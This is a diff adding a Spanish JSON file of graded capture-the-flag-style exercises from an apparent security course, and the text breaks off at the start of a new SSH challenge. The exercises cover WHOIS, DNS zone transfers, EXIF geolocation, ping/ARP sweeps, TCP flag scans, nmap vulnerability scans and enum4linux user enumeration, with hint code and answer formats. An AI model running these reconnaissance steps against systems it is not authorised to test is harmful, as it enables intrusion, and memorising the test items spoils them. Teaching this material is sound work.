@@ -1,0 +1,611 @@
+[
+    {
+        "Nombre del reto": "Er1-UD1-Whois",
+        "Enunciado del reto": "La Agencia Vasca de la Aeron\u00e1utica y el Espacio (AVAE) lleva muchos a\u00f1os trabajando en secreto. Dentro de 6 meses realizar\u00e1 su presentaci\u00f3n p\u00fablica, y dar\u00e1 comienzo a varios retos pioneros: que un robot explore Neptuno desde dentro, enviar una expedici\u00f3n que pise Marte...\n\nConsciente de la gran exposici\u00f3n a la que va a estar sometida, la agencia desea hacer una exhaustiva auditor\u00eda de todo su sistema inform\u00e1tico. Tu empresa ha sido contratada para ello, y tu primera misi\u00f3n es dirigir una campa\u00f1a de concienciaci\u00f3n. El departamento de inform\u00e1tica te ha pedido que env\u00edes hoy mismo un informe; el objetivo del documento es mostrar a los miembros del equipo directivo de la AVAE con qu\u00e9 facilidad se puede obtener informaci\u00f3n de la organizaci\u00f3n. Siendo un hacker experimentado, te lo has tomado con calma. Has ido con tu port\u00e1til a la playa y trabajar\u00e1s desde all\u00ed. Despu\u00e9s de andar aqu\u00ed y all\u00e1, enciendes el ordenador, y \u00a1\u00a1solo te queda media hora de la bater\u00eda!!, Y el cargador est\u00e1 en casa. Tienes 30 minutos para encontrar datos significativos y enviar algo interesante.  El informe no se refiere a la red de la sede central, sino a un dominio secreto de otra parte.\n\n\u00bfSer\u00e1s capaz de encontrar informaci\u00f3n interesante?",
+        "hitos": [
+            {
+                "Nombre del hito": "Er1-UD1-Mug1",
+                "Puntos": 5,
+                "Enunciado del hito": "\u00bfCu\u00e1l es el segundo nombre de dominio (el que contiene la cifra 2) de scanme.org?\n\nFORMATO DE LA SOLUCI\u00d3N: xxxxxx.xxxx.xxxxx\nPor ejemplo: tknika2.hezk.ziber"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er1-UD1-Mug1-Pista1",
+                "Puntos": 1,
+                "Enunciado de la pista": "La variable \"consulta\" es un objeto; entre otros, tiene los siguientes atributos: \n   -name\n   -name_servers \n   -registrar\n   -creation_date\n   -expiration_date\n   -last_updated"
+            },
+            {
+                "Nombre de la pista": "Er1-UD1-Mug1-Pista2",
+                "Puntos": 2,
+                "Enunciado de la pista": "for ns in consulta.name_servers:\n   print (?????????)"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er2-UD1-DNS",
+        "Enunciado del reto": "Ahora debes realizar una subauditor\u00eda sobre el servicio DNS. Tu port\u00e1til est\u00e1 en la red de la sede central, en el dominio principal. Pero, como sabes, la entidad tiene otras sedes y dominios, por lo que la subauditor\u00eda ser\u00e1 tanto de caja blanca como de caja negra. Analizar\u00e1s el dominio principal por dentro (caja blanca) y los dem\u00e1s desde fuera (caja negra).",
+        "hitos": [
+            {
+                "Nombre del hito": "Er2-UD1-Mug1",
+                "Puntos": 5,
+                "Enunciado del hito": "Utiliza el script ER2_UD1_Kontsulta_DNS.py. \u00bfCu\u00e1l es el valor del registro MX de scanme.org?\nFORMATO DE LA SOLUCI\u00d3N: xxxx.xxxxx.xxx\nPor ejemplo: mail.ziber.eus"
+            },
+            {
+                "Nombre del hito": "Er2-UD1-Mug2",
+                "Puntos": 5,
+                "Enunciado del hito": "Utiliza el script ER2_UD1_Transferentzia_DNS.py. \n\u00bfCu\u00e1l es el tel\u00e9fono de Pippa del dominio zonetransfer.me (81.4.108.41)?\n\nFORMATO DE LA RESPUESTA: +NNNNNNNNNNN.\n\u00a1\u00a1Sin espacios!!\nPor ejemplo: +34567890123."
+            },
+            {
+                "Nombre del hito": "Er2-UD1-Mug3",
+                "Puntos": 5,
+                "Enunciado del hito": "Utiliza el script ER2_UD1_Transferentzia_DNS.py. \nSolicita una transferencia de zona al servidor DNS  (192.168.1.150) del dominio zibertknika.eus. \u00bfCu\u00e1l es la \u00faltima palabra de la respuesta recibida?"
+            },
+            {
+                "Nombre del hito": "Er2-UD1-Mug4",
+                "Puntos": 15,
+                "Enunciado del hito": "Primero, toma el control (root/python) del servidor DNS (192.168.1.150) del dominio zibertknika.eus tu dominio. . \nModifica un fichero de configuraci\u00f3n para que las transferencias de zona desde la m\u00e1quina Kali/Linux sean aceptadas. \nEntonces, utiliza el script ER2_UD1_Transferentzia_DNS.py.\nCu\u00e1l es la IP de la m\u00e1quina dnssecondary?"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er2-UD1-Mug1-Pista 1",
+                "Puntos": 1,
+                "Enunciado de la pista": "print(....)"
+            },
+            {
+                "Nombre de la pista": "Er2-UD1-Mug1-Pista 2",
+                "Puntos": 2,
+                "Enunciado de la pista": "Mira c\u00f3mo se imprimen los dem\u00e1s registros. "
+            },
+            {
+                "Nombre de la pista": "Er2-UD1-Mug2-Pista 1",
+                "Puntos": 1,
+                "Enunciado de la pista": "    zone = dns.zone.from_xfr(...)\n"
+            },
+            {
+                "Nombre de la pista": "Er2-UD1-Mug2-Pista 2",
+                "Puntos": 2,
+                "Enunciado de la pista": "zone = dns.zone.from_xfr(dns.query.xfr(Dir_IP, DOMINIO))"
+            },
+            {
+                "Nombre de la pista": "Er2-UD1-Mug3-Pista1",
+                "Puntos": 1,
+                "Enunciado de la pista": "En qu\u00e9 red est\u00e1s?"
+            },
+            {
+                "Nombre de la pista": "Er2-UD1-Mug3-Pista 2",
+                "Puntos": 2,
+                "Enunciado de la pista": "\u00bfQu\u00e9 servidor DNS tienes configurado?\nUtiliza nslookup (por ejemplo) contra la m\u00e1quina DNS para saber el dominio. "
+            },
+            {
+                "Nombre de la pista": "Er2-UD1-Mug4-Pista1",
+                "Puntos": 2,
+                "Enunciado de la pista": "Con\u00e9ctate a la m\u00e1quina DNS mediante ssh. Las credenciales est\u00e1n en el enunciado.\nBirpasatu apunteak jakiteko zer ikutu bertan. "
+            },
+            {
+                "Nombre de la pista": "Er2-UD1-Mug4-Pista 2",
+                "Puntos": 6,
+                "Enunciado de la pista": "El fichero a configurar es /etc/bind/named.conf.local. \nA\u00f1ade la l\u00ednea alllow-transfer... poniendo la IP del Kali. \nNo te olvides de reiniciar el servicio bind9. "
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er3-UD1-Geolokalizazioa",
+        "Enunciado del reto": "Es una ardua tarea rastrear todos los activos de la organizaci\u00f3n por el Mundo. En esta fase es importante conocer la ubicaci\u00f3n f\u00edsica de algunos dispositivos. Por lo tanto, para agilizar el proceso, has decidido crear un par de scripts. El primero, recibidas unas coordenadas, te da su ciudad; el segundo, por su parte, hace el proceso contrario.\n",
+        "hitos": [
+            {
+                "Nombre del hito": "Er3-UD1-Mug1",
+                "Puntos": 15,
+                "Enunciado del hito": "Has encontrado algunas coordenadas en un archivo oculto:\n   Latitud: 38.80\n   Longitud: -9.37\n\nPuede ser una buena opci\u00f3n para probar tu primer script. \u00bfA qu\u00e9 ciudades corresponden estas coordenadas?\nUtiliza el script ER3_UD1_Geolokalizazioa_Bat.py. "
+            },
+            {
+                "Nombre del hito": "Er3-UD1-Mug2",
+                "Puntos": 10,
+                "Enunciado del hito": "Entre la informaci\u00f3n encontrada has visto la siguiente direcci\u00f3n:\nMineros 14, R\u00edo Turbio, Santa Cruz, Argentina\n\nDe nuevo puede ser la opci\u00f3n ideal para probar uno de tus scripts. \u00bfQu\u00e9 coordenadas corresponden a esa direcci\u00f3n?\n\nUtilizar el script ER3_UD1_Geolocalizaci\u00f3n_Bi.py\n\nFORMATO DE LA SOLUCI\u00d3N: [Latitud];[Longitud]  (con 2 decimales, usando el punto)\nPor ejemplo: 45.67;-83.21"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er3-UD1-Mug1-Pista 1",
+                "Puntos": 2,
+                "Enunciado de la pista": "Las dos funciones tiene que retrnar True o False. "
+            },
+            {
+                "Nombre de la pista": "Er3-UD1-Mug1-Pista 2",
+                "Puntos": 7,
+                "Enunciado de la pista": "def latitud_correcta(lat): \n    if not (-90 <= lat <= 90):\n        return False\n    else:\n        return True\n\nif obtener_ciudad(latitud, longitud) is not None:"
+            },
+            {
+                "Nombre de la pista": "Er3-UD1-Mug2-Pista 1",
+                "Puntos": 2,
+                "Enunciado de la pista": "La variable \"localizacion\" es un objeto. Entre sus atributos est\u00e1n los siguientes: \n   address\n   longitude\n   point\n   raw\n   latitude"
+            },
+            {
+                "Nombre de la pista": "Er3-UD1-Mug2-Pista 2",
+                "Puntos": 4,
+                "Enunciado de la pista": "if localizacion is not None:\n    latitud = localizacion.latitude\n........"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er4-UD1-Metadatuak",
+        "Enunciado del reto": "Has encontrado dos fotos en un servidor. Aparentemente no tienen nada de particular, pero en ciberseguridad cualquier archivo ingenuo puede proporcionarte informaci\u00f3n \u00fatil. \u00bfSer\u00e1 capaz de obtener algo jugoso de esas im\u00e1genes?",
+        "hitos": [
+            {
+                "Nombre del hito": "Er4-UD1-Mug1",
+                "Puntos": 12,
+                "Enunciado del hito": "\u00bfCon qu\u00e9 modelo de c\u00e1mara fue tomada la foto \"er4_irudia_ba.jpg\"?\nUtilia el script Er4_UD1_Metadatuak_Bat.py. "
+            },
+            {
+                "Nombre del hito": "Er4-UD1-Mug2",
+                "Puntos": 28,
+                "Enunciado del hito": "\u00bfEn qu\u00e9 ciudad se tom\u00f3 la foto \"er4_irudia_bi.jpg\"?\nUtiliza el script Er4_UD1_Metadatuak_Bi.py."
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er4-UD1-Mug1-Pista 1",
+                "Puntos": 2,
+                "Enunciado de la pista": "Para ver si el fichero existe, puedes utilizar os.path.isfile. \nPara el resto de tareas, utiliza las funciones definidas de manera ordenada. "
+            },
+            {
+                "Nombre de la pista": " Er4-UD1-Mug1-Pista 2",
+                "Puntos": 5,
+                "Enunciado de la pista": "   while not os.path.isfile (archivo):\n        archivo= input (\"El archivo no existe en la ruta especificada. Introduce la ruta nuevamente:\")\n    metadatos = obtener_datos_exif(archivo)\n    modelo_camara = obtener_modelo_camara(metadatos)"
+            },
+            {
+                "Nombre de la pista": "Er4-UD1-Mug2-Pista 1",
+                "Puntos": 5,
+                "Enunciado de la pista": "from ER3_UD1_Geolokalizazioa_Bat import obtener_ciudad, latitud_correcta, longitud_correcta"
+            },
+            {
+                "Nombre de la pista": "Er4-UD1-Mug2-Pista 2",
+                "Puntos": 10,
+                "Enunciado de la pista": ".....................\n   \n archivo= input (.......)\n    ??????? = obtener_datos_exif(??????)\n    ??????? = obtener_geolocalizacion(???????)\n    latitud, longitud = obtener_coordenadas(????????)\n    if latitud_correcta(????????) and longitud_correcta(???????):\n        ciudad = obtener_ciudad(??????, ???????)  \n\n.........."
+            },
+            {
+                "Nombre de la pista": "Er4-UD1-Mug2-Pista 3",
+                "Puntos": 24,
+                "Enunciado de la pista": "#El m\u00f3dulo PIL proporciona funciones y clases para manipular im\u00e1genes. Importamos su clase Image\nfrom PIL import Image\n#Importamos las constantes TAGS y GPSTAGS del m\u00f3dulo ExifTags en el paquete PIL. Estas constantes contienen los nombres de las\n#etiquetas EXIF est\u00e1ndar y etiquetas GPS respectivamente.\nfrom PIL.ExifTags import TAGS, GPSTAGS\n#Importamos este m\u00f3dulo para interactuar con el sistema operativo. En este ejercicio en concreto, para comprobar si el archivo\n#introducido por el usuario existe\nimport os\n#(\u25d5\u203f\u2212)OPCIONAL: Importamos las funciones obtener_ciudad, latitud_correcta y longitud_correcta del script ER3_UD1_Geolokalizazioa_Bat\nfrom ER3_UD1_Geolokalizazioa_Bat_SOLUZIOA import obtener_ciudad, latitud_correcta, longitud_correcta\n\n#Funci\u00f3n que obtiene los datos EXIF de una imagen, devolvi\u00e9ndolos en una tupla\ndef obtener_datos_exif(imagen):\n    diccionario_exif = {}\n    try:\n        img = Image.open(imagen)\n        diccionario_exif = img._getexif()\n    except:\n        print (\"Error inesperado al obtener los datos de la imagen proporcionada\")\n    return diccionario_exif\n\n# Funci\u00f3n que obtiene los datos de geolocalizaci\u00f3n a partir de los datos EXIF de una imagen y los devuelve en una tupla\ndef obtener_geolocalizacion(datos_exif):\n    if not datos_exif:\n        raise ValueError(\"No se encontraron metadatos EXIF\")\n    geolocalizacion = {}\n    clave_gps_info = None\n    #Estamos iterando sobre las claves y valores del diccionario TAGS. En cada iteraci\u00f3n, key representa la clave actual y\n    #value representa el valor correspondiente. clave_gps_info almacenar\u00e1 el valor del c\u00f3digo de la etiqueta GPSInfo. Podr\u00edamos\n    #haber asumido como clave la que tiene en la actualizad (34853), pero, \u00bfy si var\u00eda?\n    for clave, valor in TAGS.items():\n        if valor == 'GPSInfo':\n            clave_gps_info = clave\n    #Si hay datos de geolocalizaci\u00f3n y la clave encontrada est\u00e1 dentro del diccionario recibido, formamos una tupla (\"geolocalizacion\")\n    #s\u00f3lo con la informaci\u00f3n que nos interesa.    \n    if clave_gps_info is not None and clave_gps_info in datos_exif:\n        gps_info = datos_exif[clave_gps_info]\n        for clave_gps, valor_gps in gps_info.items():\n            if clave_gps in GPSTAGS:\n                geolocalizacion[GPSTAGS[clave_gps]] = valor_gps\n    #El contenido de la tupla \"geolocalizacion\" ser\u00e1 algo as\u00ed como:\n    #{'GPSVersionID': b'\\x02\\x02\\x00\\x00', 'GPSLatitudeRef': 'N', 'GPSLatitude': (40.0, 41.0, 21.12),\n    # 'GPSLongitudeRef': 'W', 'GPSLongitude': (74.0, 2.0, 40.2), 'GPSAltitudeRef': b'\\x00', 'GPSAltitude': 10.0,\n    # 'GPSTimeStamp': (0.0, 0.0, 0.0), 'GPSProcessingMethod': '', 'GPSDateStamp': '00:00:00'}\n    return geolocalizacion\n\n# Funci\u00f3n que obtiene las coordenadas GPS de latitud y longitud a partir de los datos de geolocalizaci\u00f3n y los devuelve en\n# dos variables\ndef obtener_coordenadas(geolocalizacion):\n    latit = None\n    longit = None\n    #Dentro de la tupla, iteramos s\u00f3lo sobre las claves que nos interesan para obtener sus valores. \n    #Convertimos el valor de esas claves a coordenada decimal. Por ejemplo, GPSLatitude lo pasaremos de (40.0, 41.0, 21.12)\n    #a 40.6892\n    for key in ['GPSLatitude', 'GPSLongitude', 'GPSLatitudeRef', 'GPSLongitudeRef']:\n        if key in geolocalizacion:\n            if key == 'GPSLatitude':\n                latit = convertir_a_decimal(geolocalizacion[key])\n            if key == 'GPSLongitude':\n                longit = convertir_a_decimal(geolocalizacion[key])\n            if key == 'GPSLatitudeRef' and geolocalizacion[key] == 'S':\n                latit = 0 - latit\n            if key == 'GPSLongitudeRef' and geolocalizacion[key] == 'W':\n                longit = 0 - longit\n    return latit, longit\n\n# Funci\u00f3n que convierte los valores GPS de grados, minutos y segundos a valores decimales\ndef convertir_a_decimal(coordenada):\n    grados = float(coordenada[0])\n    minutos = float(coordenada[1])\n    segundos = float(coordenada[2])\n    return grados + minutos / 60 + segundos / 3600\n\n#(\u25d5\u203f\u2212) Escribir el cuerpo del script\nif __name__ == '__main__':\n    #Pedimos al usuario que introduzca la ruta de un archivo. Mientras el archivo introducido no exista, se lo volveremos a\n    #solicitar. \n    archivo = input (\"Introduce la ruta completa del archivo: \")\n    while not os.path.isfile (archivo):\n        archivo= input (\"El archivo no existe en la ruta especificada. Introduce la ruta nuevamente:\")\n    #Obtenemos los metadatos del archivo\n    datos_exif = obtener_datos_exif(archivo)\n    #Creamos una tupla s\u00f3lo con los metadatos relativos a la geolocalizaci\u00f3n\n    geolocalizacion = obtener_geolocalizacion(datos_exif)\n    #Creamos una tupla s\u00f3lo con los metadatos relativos a la geolocalizaci\u00f3n\n    latitud, longitud = obtener_coordenadas(geolocalizacion)\n    #Comprobamos si la latitud y la longitud tienen  valores crrectos. Si los tienen, obtenemos la ciudad. Para ello,\n    #podemos utilizar funciones del script ER3_UD1_Geolokalizazioa_Bat\n    if latitud_correcta(latitud) and longitud_correcta(longitud):\n        ciudad = obtener_ciudad(latitud, longitud)\n        if ciudad is not None:\n            print(f\"La foto se ha tomado en la ciudad de {ciudad}\")\n        else:\n            print(\"No se ha podido obtener la ciudad en la que se ha tomado la foto\")\n    else:\n        print (\"El valor de la latitud o de la longitud no es correcto\")"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er1-UD2-Barrido",
+        "Enunciado del reto": "Has presentado un par de informes a la AVAE para justificar el trabajo realizado. No son muy profundos, pero la organizaci\u00f3n se ha mostrado bastante satisfecha con lo expuesto.\nAhora, una vez finalizada la fase de reconocimiento, empezar\u00e1s con la fase de enumeraci\u00f3n. Y, de entrada, tienes que tratar de saber cu\u00e1les son todos los dispositivos que hay en la red. Empezar\u00e1s por el camino m\u00e1s sencillo. \nDebes modificar el script para permitir que el usuario ejecute un barrido PING o un barrido ARP. Entonces, deber\u00e1s encontrar la soluci\u00f3n a cada hito. ",
+        "hitos": [
+            {
+                "Nombre del hito": "Er1-UD2-Mug1",
+                "Puntos": 9,
+                "Enunciado del hito": "Primero lanzar\u00e1s un Ping Sweep en tu red local. \u00bfCu\u00e1l es la IP de la segunda m\u00e1quina activa que ha aparecido?"
+            },
+            {
+                "Nombre del hito": "Er1-UD2-Mug2",
+                "Puntos": 11,
+                "Enunciado del hito": "Esta vez har\u00e1s un ARP Sweep.\n\u00bfCu\u00e1l es la IP de la nueva m\u00e1quina aparecida?\n\n\u00bfPor qu\u00e9 no ha aparecido esta IP al hacer el PING Sweep?\nA- Porque ha estado apagado.\nB- Por no tener configuraci\u00f3n a nivel de red, s\u00f3lo direcci\u00f3n f\u00edsica.\nC- Porque tiene prohibido al menos el tr\u00e1fico ICMP de entrada desde la m\u00e1quina Kali ().\nD- Es aleatorio. A veces aparecer\u00e1 y a veces no.\nE- Porque el ARP Sweep lo hemos lanzado con sudo. \n\nFORMATO DE RESPUESTA: [Letra de la respuesta_correcta]; [IP]\nEjemplo: E;192.168.76.245"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er1-UD2-Pista2",
+                "Puntos": 2,
+                "Enunciado de la pista": " if  (funcion.lower() == \"p\"):\n\nelse\n"
+            },
+            {
+                "Nombre de la pista": " Er1-UD2-Pista1",
+                "Puntos": 2,
+                "Enunciado de la pista": "    for direccion_ip in direccion_red.hosts():       \n"
+            },
+            {
+                "Nombre de la pista": " Er1-UD2-Pista3",
+                "Puntos": 8,
+                "Enunciado de la pista": "               if respuesta == 0:\n                    print(f\"La direcci\u00f3n IP {direccion_ip} est\u00e1 activa.\")"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er2-UD2-Eskaneoak",
+        "Enunciado del reto": "Como hemos visto en el paso anterior, existen varias IP activas en nuestra red; tendr\u00e1s que jugar con algunos de ellas para ver si han dejado alg\u00fan servicio disponible.\n\u00a1\u00a1Atenci\u00f3ni!! Tendr\u00e1s que ejecutar el script con permisos de administraci\u00f3n. ",
+        "hitos": [
+            {
+                "Nombre del hito": "Er2-UD2-Mug1",
+                "Puntos": 7,
+                "Enunciado del hito": "\u00bfCu\u00e1l es el estado de los puertos 21, 22 y 445 del equipo con IP 192.168.1.160?\nRealiza un SYN Scan.\nFORMATO DE LA RESPUESTA: [21-estado]; [22-estado]; [445-estado]. \nEstado: \n  Abierto: OP\n      Cerrado: CL\n      Filtrado: FI\n      No-filtrado: NFI\n      Indeterminado: IN\nPor ejemplo: si el puerto 21 est\u00e1 abierto, el 22 cerrado y el 445 filtrado: \n               OP;CL;FI"
+            },
+            {
+                "Nombre del hito": "Er2-UD2-Mug2",
+                "Puntos": 7,
+                "Enunciado del hito": "\u00bfCu\u00e1l es el estado de los puertos 21, 22 y 445 del equipo con IP 192.168.1.3?\nRealiza un ACK Scan.\nFORMATO DE LA RESPUESTA: [21-estado]; [22-estado]; [445-estado]. \nEstado: \n      Abierto: OP\n      Cerrado: CL\n      Filtrado: FI\n      No-filtrado: NFI\n      Indeterminado: IN\nPor ejemplo: si el puerto 21 est\u00e1 abierto, el 22 cerrado y el 445 filtrado: \n               OP;CL;FI"
+            },
+            {
+                "Nombre del hito": "Er2-UD2-Mug34",
+                "Puntos": 7,
+                "Enunciado del hito": "\u00bfCu\u00e1l es el estado de los puertos 21, 22 y 445 del equipo con IP 192.168.1.4?\nRealiza un FIN Scan.\nFORMATO DE LA RESPUESTA: [21-estado]; [22-estado]; [445-estado]. \nEstado: \n      Abierto: OP\n      Cerrado: CL\n      Filtrado: FI\n      No-filtrado: NFI\n      Indeterminado: IN\nPor ejemplo: si el puerto 21 est\u00e1 abierto, el 22 cerrado y el 445 filtrado: \n               OP;CL;FI"
+            },
+            {
+                "Nombre del hito": "Er2-UD2-Mug4",
+                "Puntos": 9,
+                "Enunciado del hito": "Para responder al siguiente test, adem\u00e1s de las ya realizadas, realice escaneos TCP contra las IP 192.168.1.3, 192.168.1.4 y 192.168.1.7.\n\n1) Respecto a la IP 192.168.1.3:\n   a) El puerto 21 est\u00e1 filtrado; hay un servicio en el puerto 22 y lo tenemos accesible; no hay ning\u00fan servicio en los puertos 80 y 445.\n   b) Hay un servicio en el puerto 21, y lo tenemos accesible; el puerto 22 est\u00e1 filtrado; no hay ning\u00fan servicio en los puertos 80 y 445.\n   c) No hay ning\u00fan servicio en los puertos 21 y 22; en los puertos 80 y 445, no se puede saber.\n   d) Hay un servicio en el puerto 22, y lo tenemos accesible; no hay servicio en los puertos 21 y 80; el puerto 445 est\u00e1 filtrado.\n\n2) Respecto a la IP 192.168.1.4:\n   a) El puerto 21 est\u00e1 filtrado; hay un servicio en el puerto 22 y lo tenemos accesible; no hay ning\u00fan servicio en los puertos 80 y 445.   \n   b) Hay un servicio en cada uno de los puertos 21 y 80, y est\u00e1n accesibles; el puerto 22 est\u00e1 filtrado; no hay ning\u00fan servicio en el puerto 445.\n   c) No hay ning\u00fan servicio en los puertos 21 y 22; en los puertos 80 y 445, no se puede saber.\n   d) Hay un servicio en el puerto 22, y lo tenemos accesible; no hay ning\u00fan servicio en los puertos 21 y 80; el puerto 445 est\u00e1 filtrado. \n\n3) Respecto a la IP 192.168.1.7:\n   a) El puerto 21 est\u00e1 filtrado; hay un servicio en el puerto 22 y lo tenemos disponible; no hay ning\u00fan servicio en los puertos 80 y 445.\n   b) Hay un servicio en el puerto 21, y lo tenemos disponible; el puerto 22 est\u00e1 filtrado; no hay ning\u00fan servicio en los puertos 80 y 445.\n   c) No hay ning\u00fan servicio en los puertos 21 y 22; en los puertos 80 y 445, no se puede saber.\n   d) No hay ning\u00fan servicio en los puertos 21 y 445; hay un servicio en el puerto 22 y lo tenemos disponible; el puerto 80 est\u00e1 filtrado. \n\nFORMATO DE LA RESPUESTA: [1respuesta_correcta];[2respuesta_correcta][3respuesta_correcta]\nPor ejemplo: si las respuestas correctas son 1b, 2c y 3d:\n        b;c;d"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er2-UD2-Pista-Mug1-2-3",
+                "Puntos": 9,
+                "Enunciado de la pista": "            #****************************************************\n            #VALOR FLAGS. DECIMAL Y HEXADECIMAL*\n            #FIN: Decimal: 1    Hexadecimal:   0x01           *\n            #SYN: Decimal: 2   Hexadecimal:  0x02            *\n            #RST: Decimal: 4   Hexadecimal:   0x04           *\n            #PSH: Decimal: 8   Hexadecimal:  0x08            *\n            #ACK: Decimal: 16 Hexadecimal:  0x10            *\n            #URG: Decimal: 32 Hexadecimal: 0x20            *\n            #*****************************************************\nEjemplo:  Flag PSH/ACK = 0x18"
+            },
+            {
+                "Nombre de la pista": "Er2-UD2-Pista-Test",
+                "Puntos": 7,
+                "Enunciado de la pista": "Por cada IP:\nHaz un SYN SCAN para saber qu\u00e9 puertos est\u00e1n abiertos. . \nA continuaci\u00f3n, haz un ACK Scan para saber si los que han aparecido como cerrados est\u00e1n filtrados;. Si lo est\u00e1n, quiere decir que hay un firewall filtrando el tr\u00e1fico hacia ese puerto; si no, podemos inferir que en ese puerto no hay ning\u00fan servicio en marcha. "
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er3-UD2-Nmap",
+        "Enunciado del reto": "Has obtenido informaci\u00f3n muy importante sobre ciertos dispositivos, y tambi\u00e9n sabes que algunos de ellos tienen un firewall delante\nAhora va a comenzar una prueba mucho m\u00e1s larga, tratando de encontrar todos los servicios abiertos y cerrados en una red completa, direcci\u00f3n por direcci\u00f3n.\nUtilizar\u00e1s la famosa herramienta NMAP. \u00a1Animar!",
+        "hitos": [
+            {
+                "Nombre del hito": "Er3-UD2-Mug1",
+                "Puntos": 10,
+                "Enunciado del hito": "Haz un escaneo de la red 192.168.1.0/24 en el tramo de puertos 21-80, \u00bfcu\u00e1l es la primera IP m\u00e1s baja que aparece con el puerto 80 abierto?\nUtiliza el script Er3_UD2_NMAP_Atakak.py. "
+            },
+            {
+                "Nombre del hito": "Er3-UD2-Mug2",
+                "Puntos": 10,
+                "Enunciado del hito": "Haz un escaneo de la red 192.168.1.0/24 para los puertos 20,21,22,53,80,443 y 502, \u00bfcu\u00e1les son los puertos cerrados de la IP 192.168.1.200?\nUtiliza el script Er3_UD2_NMAP_Atakak.py. \nFORMATO DE LA SOLUCI\u00d3N: [puerto_cerrado1][puerto_cerrado2][puerto_cerrado33]\nPor ejemplo: 22,53,80"
+            },
+            {
+                "Nombre del hito": "Er3-UD2-Mug3",
+                "Puntos": 10,
+                "Enunciado del hito": "Obt\u00e9n las vulnerabilidades asociadas a los puertos  22 y 80 de la red 192.168.1.0/24. \u00bfCu\u00e1l es la vulnerabilidad m\u00e1s grave del puerto 22 del dispositivo con IP 192.168.1.200?\nFORMATO DE LA SOLUCI\u00d3N: CVE-xxxx-yyyy\nPor ejemplo: CVE-2019-8743"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er3-UD2-Mug3-Pista1",
+                "Puntos": 2,
+                "Enunciado de la pista": "nm=nmap.PortScanner()\n"
+            },
+            {
+                "Nombre de la pista": "Er3-UD2-Mug3-Pista2",
+                "Puntos": 4,
+                "Enunciado de la pista": "estructuraNmap=formateoNmapScan(????)\n......\nfor puertoOpen in host.puertosAbiertos:"
+            },
+            {
+                "Nombre de la pista": "Er3-UD2-Mug1-2-Pista1",
+                "Puntos": 4,
+                "Enunciado de la pista": " nm = nmap.PortScanner()\n nm.scan(destino, puertos_destino, arguments=\"-sV -n -T5\")  "
+            },
+            {
+                "Nombre de la pista": " Er3-UD2-Mug1-2-Pista2",
+                "Puntos": 8,
+                "Enunciado de la pista": "for host in estructuraNmap:\n            print(\"Host: \"+ host.host)\n            if (funcion.lower() == \"a\"):\n                print (\"Listado de puertos abiertos:\")\n                for puertoOpen in host.puertosAbiertos:  \n                    #Imprimimos el puerto, nombre del servicio y la versi\u00f3n "
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er4-UD2-Enum4linux",
+        "Enunciado del reto": "Despu\u00e9s de lo visto hasta ahora, parece que en la IP 192.168.1.200 tenemos un caramelo. \u00bfSer\u00e1s capaz de obtener alg\u00fan dato significativo del sistema?\n ",
+        "hitos": [
+            {
+                "Nombre del hito": "Er4-UD2-Mug1",
+                "Puntos": 4,
+                "Enunciado del hito": "\u00bfCu\u00e1l es la complejidad de la pol\u00edtica de contrase\u00f1as del dispositivo con IP 192.168.1.200?\nIntroduce una palabra como soluci\u00f3n."
+            },
+            {
+                "Nombre del hito": "Er4-UD2-Mug2",
+                "Puntos": 4,
+                "Enunciado del hito": "\u00bfCu\u00e1l es la versi\u00f3n de Samba?\nERANTZUNAREN FORMATUA: n.n.nn\nAdibidez: 2.0.21"
+            },
+            {
+                "Nombre del hito": "Er4-UD2-Mug3",
+                "Puntos": 12,
+                "Enunciado del hito": "Guarda la lista de usuarios de la m\u00e1quina con IP 192.168.1.200 en un fichero. \n\u00bfCu\u00e1l es el primer usuario?"
+            }
+        ],
+        "pistas": [
+            {
+                "Nombre de la pista": "Er4-UD2-Mug1-Pista1",
+                "Puntos": 1,
+                "Enunciado de la pista": "XXXXXX= stdout_texto"
+            },
+            {
+                "Nombre de la pista": "Er4-UD2-Mug1-Pista2",
+                "Puntos": 2,
+                "Enunciado de la pista": "print (informacion_complejidad)"
+            },
+            {
+                "Nombre de la pista": "Er4-UD2-Mug2-Pista1",
+                "Puntos": 1,
+                "Enunciado de la pista": "if not hay_info_so:\n            print (\"No se ha encontrado informaci\u00f3n sobre el sistema operativo\")"
+            },
+            {
+                "Nombre de la pista": "Er4-UD2-Mug2-Pista2",
+                "Puntos": 2,
+                "Enunciado de la pista": "print (sistema_operativo)"
+            },
+            {
+                "Nombre de la pista": " Er4-UD2-Mug3-Pista1",
+                "Puntos": 2,
+                "Enunciado de la pista": "stdout_texto = subprocess.check_output([\"enum4linux\", \"-a\", direccion], text=True)"
+            },
+            {
+                "Nombre de la pista": " Er4-UD2-Mug3-Pista2",
+                "Puntos": 2,
+                "Enunciado de la pista": " nombres_usuario = re.findall(r'user:\\[(\\w+)\\] rid:', stdout_texto)"
+            },
+            {
+                "Nombre de la pista": " Er4-UD2-Mug3-Pista3",
+                "Puntos": 5,
+                "Enunciado de la pista": "archivo_resultados = open(\"resultados_usuarios.txt\", \"w\")\n        archivo_resultados.write(\"NOMBRES DE USUARIO:\\n\")\n        for nombre_usuario in nombres_usuario:\n            archivo_resultados.write(nombre_usuario + \"\\n\")"
+            }
+        ]
+    },
+    {
+        "Nombre del reto": "Er1-UD3-SSH",
